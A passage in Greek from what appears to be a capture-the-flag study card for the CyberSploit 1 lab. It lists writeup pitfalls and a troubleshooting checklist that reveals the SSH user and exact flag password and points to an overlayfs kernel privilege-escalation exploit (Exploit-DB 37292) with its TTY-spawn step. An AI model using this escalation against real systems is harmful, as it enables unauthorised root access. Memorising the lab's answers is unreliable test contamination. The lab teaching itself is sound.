  - **Παγίδες που παρατηρήθηκαν σε writeups:** το «τύλιγμα» των μεγάλων γραμμών base64/δυαδικού του `flag2.txt` όταν τις κολλάτε σε αρχείο (σπάει την ομαδοποίηση)· το `Permission denied` στο `./ofs` (τρέξτε `chmod +x ofs`)· η παράλειψη του τελικού newline μετά το `base64 -d`, οπότε η προτροπή κολλά πάνω στην έξοδο· και η επανεκτέλεση του overlayfs exploit χωρίς καθαρισμό — **ένα ξεχασμένο `/etc/ld.so.preload` ή ένα `/etc/passwd` εγγράψιμο από όλους (`chmod 644 /etc/passwd` για επαναφορά) μπορεί να αφήσει το VM σπασμένο για την επόμενη φορά.**
  - **Δύο διορθώσεις που αξίζει να σημειωθούν** (αφορούσαν παλαιότερες εκδόσεις αυτής της κάρτας): (1) το Base64 του `robots.txt` αποκωδικοποιείται με **newlines** — απαιτείται `base64 -d` (ή `-D` σε macOS)· το `echo … | base64` απλώς *κωδικοποιεί*· (2) το `ls -la flag2.txt` αναφέρει **1036 bytes** στην εικόνα του lab — παλαιότερες αναθεωρήσεις της κάρτας έλεγαν 224, που ήταν λάθος.
  - **Επαληθευμένες πηγές:** j.info (`<https://j.info/linux/writeup/2018/10/12/cybersploit-1.html>`), NEOSPLOIT (`<https://neosploit.github.io/machines/cybersploit1.html>`), Infosec Articles (`<https://infosecarticles.com/cybersploit-1.html>`), Exploit-DB 37292 (`<https://www.exploit-db.com/exploits/37292>`).

# Μέρος Η — Αν κολλήσετε τελείως

Δουλέψτε αυτή τη λίστα ελέγχου με τη σειρά — αντικατοπτρίζει τη σειρά των σημείων συμφόρησης αυτού του μηχανήματος:

1. **Δεν φτάνετε το VM / το `10.10.10.100` αρνείται τα πάντα;** → [Μέρος Β — Το μηχάνημα](#μέρος-β--το-μηχάνημα) και [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md): διορθώστε το bridged mode· σε Windows κάντε release/renew (`ipconfig /release` + `ipconfig /renew`).
2. **Το SSH λέει `Permission denied`;** → ο χρήστης είναι ο **`itsskv`** (από το σχόλιο HTML), όχι ο `root`· ο κωδικός είναι η σημαία 1 αντιγραμμένη **ακριβώς** — `cybersploit{youtube.com/c/cybersploit}`, με αγκύλες και πεζά/κεφαλαία όπως είναι, χωρίς εισαγωγικά.
3. **Το `flag2.txt` αποκωδικοποιείται σε σκουπίδια;** → είναι **δυαδικό**, όχι base64: ελέγξτε ότι οι ομάδες είναι 8 bits, μην τυλίγετε τις γραμμές όταν αντιγράφετε, και χρησιμοποιήστε τη μονόστιχη εντολή Python από το [Βήμα 4](#βήμα-4--σύνδεση-και-η-σημαία-2-δυαδικό).
4. **Το kernel exploit αποτυγχάνει;** → τρεις κλασικές αιτίες: λείπει το `gcc` από τον στόχο (εγκαταστήστε το, ή μεταγλωττίστε **στη δική σας μηχανή για 32-bit** με `gcc -m32` — δείτε [`docs/TOOLS.md`](../../docs/TOOLS.md))· το κέλυφος δεν είναι σωστό TTY (τρέξτε πρώτα `python -c 'import pty;pty.spawn("/bin/bash")'`)· ή λάθος CVE για τον πυρήνα σας — ελέγξτε ξανά το `uname -a` απέναντι στο εύρος `3.13.0 < 3.19`, και απέναντι στο μήνυμα `no FS_USERNS_MOUNT` του Βήματος 5.
5. **`./ofs` → `Permission denied`;** → το κατέβασμα έχασε το εκτελέσιμο bit: `chmod +x ofs` και ξανατρέξτε το.
6. **Root, αλλά χωρίς σημαία;** → κάντε πρώτα `cd /root`, μετά `ls -la` για κρυφά αρχεία· οι εικόνες του Proving Grounds ονομάζουν τα αρχεία απόδειξης `local.txt` και `proof.txt` αντί γι' αυτό.
7. **Ακόμη κολλημένοι;** → διαβάστε [το πλήρες walkthrough](../../labs/2-002-cybersploit-1/README.md) ή ένα από τα writeups που αναφέρονται — αλλά μόνο *αφού* μπορείτε να πείτε ακριβώς ποιο βήμα έσπασε. Αυτή η διάγνωση είναι η πραγματική δεξιότητα.
